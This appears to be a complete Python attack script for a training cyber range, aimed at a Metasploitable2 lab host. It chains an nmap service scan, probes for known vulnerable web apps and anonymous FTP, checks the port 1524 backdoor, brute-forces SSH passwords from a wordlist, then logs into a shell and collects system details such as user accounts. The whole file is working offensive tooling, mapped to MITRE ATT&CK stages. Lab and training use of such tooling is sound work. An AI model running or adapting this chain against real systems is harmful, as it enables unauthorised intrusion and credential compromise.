#!/usr/bin/env python3
"""
Attack Chain Script — Cyber Range Platform (Multi-Service Edition)
Stages:
  1. Reconnaissance        — MITRE T1046: Network Service Discovery
  2. Service Enumeration    — MITRE T1592: Gather Victim Host Information
  3. Credential Brute Force — MITRE T1110.001: Password Guessing
  4. Exploitation & Triage  — MITRE T1059.004 & T1082
"""

import nmap
import paramiko
import datetime
import time
import os
import socket
from urllib.request import urlopen, Request
from urllib.error import URLError

TARGET = "10.0.100.20"
USERNAME = "msfadmin"
WORDLIST_FILE = "/home/kali/wordlist.txt"
LOG_FILE = "/home/kali/attack_log.txt"

def log(msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def grab_banner(ip, port, timeout=4):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        banner = s.recv(1024).decode(errors="ignore").strip()
        s.close()
        return banner
    except Exception:
        return None

def stage1_recon():
    log("=" * 60)
    log("STAGE 1: RECONNAISSANCE [MITRE T1046: Service Discovery]")
    log("=" * 60)
    log(f"Initiating TCP SYN version scan against {TARGET} ...")

    nm = nmap.PortScanner()
    ports_to_scan = "21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,5432,5900,6000,6667,8009,8180"

    t_start = time.time()
    try:
        nm.scan(hosts=TARGET, ports=ports_to_scan, arguments="-sS -sV -T4 --open")
    except Exception as e:
        log(f"[!] Scan error: {e}")
        return []

    duration = round(time.time() - t_start, 2)

    if TARGET not in nm.all_hosts():
        log(f"[!] Host {TARGET} unreachable.")
        return []

    open_ports = []
    for proto in nm[TARGET].all_protocols():
        for port in sorted(nm[TARGET][proto].keys()):
            info = nm[TARGET][proto][port]
            if info["state"] == "open":
                service = info.get("name", "unknown")
                product = info.get("product", "")
                version = info.get("version", "")
                ver_str = f"{product} {version}".strip()
                open_ports.append(port)
                log(f"[+] Port {port:>5}/{proto:<3} | {service:<12} | {ver_str}")

    log(f"[+] Recon completed in {duration}s — {len(open_ports)} open ports discovered.")
    return open_ports

def stage2_enumerate(open_ports):
    log("")
    log("=" * 60)
    log("STAGE 2: SERVICE ENUMERATION [MITRE T1592: Host Information]")
    log("=" * 60)

    findings = []

    # --- HTTP Enumeration ---
    if 80 in open_ports:
        log("[*] Probing HTTP service on port 80 ...")
        try:
            req = Request(f"http://{TARGET}/", headers={"User-Agent": "CyberRange/1.0"})
            resp = urlopen(req, timeout=5)
            server = resp.headers.get("Server", "Unknown")
            body = resp.read(4096).decode(errors="ignore")
            log(f"[+] HTTP Server Header: {server}")
            findings.append(f"HTTP: {server}")

            vuln_apps = {
                "twiki": "TWiki (Known RCE: CVE-2004-0572)",
                "tikiwiki": "TikiWiki (SQL Injection: CVE-2006-4602)",
                "phpMyAdmin": "phpMyAdmin (Remote Code Exec possible)",
                "mutillidae": "Mutillidae (OWASP Top 10 vulns)",
                "dvwa": "DVWA (Intentionally Vulnerable)",
                "phpinfo": "phpinfo() exposed (Information Leak)"
            }
            for key, desc in vuln_apps.items():
                if key.lower() in body.lower():
                    log(f"[+] Vulnerable Web App Found: {desc}")
                    findings.append(f"WebApp: {desc}")
        except Exception as e:
            log(f"[!] HTTP probe error: {e}")

        # Check common paths
        for path in ["/phpMyAdmin/", "/mutillidae/", "/dvwa/", "/twiki/"]:
            try:
                req = Request(f"http://{TARGET}{path}", headers={"User-Agent": "CyberRange/1.0"})
                resp = urlopen(req, timeout=3)
                if resp.status == 200:
                    log(f"[+] Accessible endpoint: http://{TARGET}{path} (HTTP 200)")
                    findings.append(f"Endpoint: {path}")
            except Exception:
                pass

    # --- FTP Anonymous Login ---
    if 21 in open_ports:
        log("[*] Testing FTP anonymous access on port 21 ...")
        banner = grab_banner(TARGET, 21)
        if banner:
            log(f"[+] FTP Banner: {banner}")
            findings.append(f"FTP: {banner}")
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(TARGET, 21, timeout=5)
            ftp.login("anonymous", "test@test.com")
            log(f"[+] FTP ANONYMOUS LOGIN SUCCESSFUL — server allows unauthenticated access!")
            findings.append("FTP: Anonymous login allowed")
            ftp.quit()
        except Exception:
            log(f"[-] FTP anonymous login denied (authentication required)")

    # --- Telnet Banner ---
    if 23 in open_ports:
        log("[*] Grabbing Telnet banner on port 23 ...")
        banner = grab_banner(TARGET, 23)
        if banner:
            log(f"[+] Telnet Banner: {banner[:120]}")
            findings.append(f"Telnet: Banner exposed")

    # --- Backdoor Check (port 1524) ---
    if 1524 in open_ports:
        log("[*] Checking known backdoor on port 1524 ...")
        banner = grab_banner(TARGET, 1524)
        if banner:
            log(f"[+] BACKDOOR SHELL on port 1524: {banner[:80]}")
            findings.append("Backdoor: Root shell on port 1524")
        else:
            log(f"[+] Port 1524 open — potential ingreslock/backdoor")
            findings.append("Backdoor: Port 1524 open")

    # --- MySQL Banner ---
    if 3306 in open_ports:
        log("[*] Checking MySQL service on port 3306 ...")
        banner = grab_banner(TARGET, 3306)
        if banner:
            version = banner.split("\x00")[0] if "\x00" in banner else banner[:60]
            log(f"[+] MySQL Version: {version}")
            findings.append(f"MySQL: {version}")

    log(f"[+] Enumeration complete — {len(findings)} findings collected.")
    return findings

def stage3_bruteforce():
    log("")
    log("=" * 60)
    log("STAGE 3: CREDENTIAL ATTACK [MITRE T1110.001: Password Guessing]")
    log("=" * 60)

    if not os.path.exists(WORDLIST_FILE):
        log(f"[!] Wordlist not found: {WORDLIST_FILE}")
        return None

    with open(WORDLIST_FILE, "r", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    total = len(passwords)
    log(f"Target Service   : SSH (Port 22/tcp)")
    log(f"Target Account   : {USERNAME}")
    log(f"Dictionary Loaded: {total} candidates from {WORDLIST_FILE}")
    log("-" * 60)

    t_start = time.time()

    for idx, password in enumerate(passwords, 1):
        elapsed = time.time() - t_start
        rate = round(idx / elapsed, 2) if elapsed > 0 else 0.0
        pct = round((idx / total) * 100, 1)

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                hostname=TARGET, port=22, username=USERNAME,
                password=password, timeout=5, banner_timeout=10,
                auth_timeout=8, look_for_keys=False, allow_agent=False,
                disabled_algorithms={"pubkeys": ["rsa-sha2-256", "rsa-sha2-512"]}
            )
            client.close()
            total_time = round(time.time() - t_start, 2)
            log(f"[SUCCESS] >>> VALID CREDENTIAL IDENTIFIED <<<")
            log(f"[+] Account Compromised : {USERNAME}:{password}")
            log(f"[+] Attempts Exhausted  : {idx}/{total} ({pct}%)")
            log(f"[+] Time to Compromise  : {total_time}s (Rate: {rate} req/s)")
            return password
        except paramiko.AuthenticationException:
            log(f"[-] [{idx:>2}/{total} | {pct:>5.1f}%] Failed: '{password:<14}' | {round(elapsed,1):>5.1f}s | {rate} req/s")
        except Exception as e:
            log(f"[!] [{idx:>2}/{total}] Warning: {e}")
            time.sleep(1.5)
        finally:
            try:
                client.close()
            except Exception:
                pass
        time.sleep(1.0)

    log(f"[-] Dictionary exhausted — {total} attempts, no valid credentials.")
    return None

def stage4_exploit(password):
    log("")
    log("=" * 60)
    log("STAGE 4: EXPLOITATION & TRIAGE [MITRE T1059.004 & T1082]")
    log("=" * 60)
    log(f"Establishing authenticated remote shell on {TARGET} ...")

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            hostname=TARGET, port=22, username=USERNAME, password=password,
            look_for_keys=False, allow_agent=False,
            disabled_algorithms={"pubkeys": ["rsa-sha2-256", "rsa-sha2-512"]}
        )
        log("[+] Remote shell session ESTABLISHED.")

        triage = [
            ("User Context",       "whoami"),
            ("Privilege Level",    "id"),
            ("Kernel / OS",        "uname -a"),
            ("Hostname",           "cat /etc/hostname"),
            ("User Accounts",      "cut -d: -f1 /etc/passwd | tr '\\n' ', '"),
            ("Network Interfaces", "ifconfig | grep 'inet addr' | head -5"),
            ("Listening Services", "netstat -tlnp 2>/dev/null | head -10"),
        ]

        for desc, cmd in triage:
            stdin, stdout, stderr = client.exec_command(cmd)
            out = stdout.read().decode().strip()
            log(f"[TRIAGE] {desc:<20}: {out}")
            time.sleep(0.8)

        client.close()
        log("-" * 60)
        log("[+] Triage data extracted. Session terminated.")
        log("[+] FULL ATTACK LIFECYCLE COMPLETED SUCCESSFULLY.")
    except Exception as e:
        log(f"[!] Session failed: {e}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Run with: sudo python3 attack_chain.py")

    open(LOG_FILE, "w").close()

    log("=" * 60)
    log("CYBER RANGE — AUTOMATED MULTI-STAGE ATTACK PIPELINE")
    log(f"Target : {TARGET} (Metasploitable2)")
    log(f"Origin : 10.0.100.10 (Kali Linux)")
    log("=" * 60)
    log("")

    ports = stage1_recon()
    findings = stage2_enumerate(ports)
    password = stage3_bruteforce()

    if password:
        stage4_exploit(password)
    else:
        log("[!] No credentials found — skipping exploitation.")

    log("")
    log(f"[+] Log saved: {LOG_FILE}")
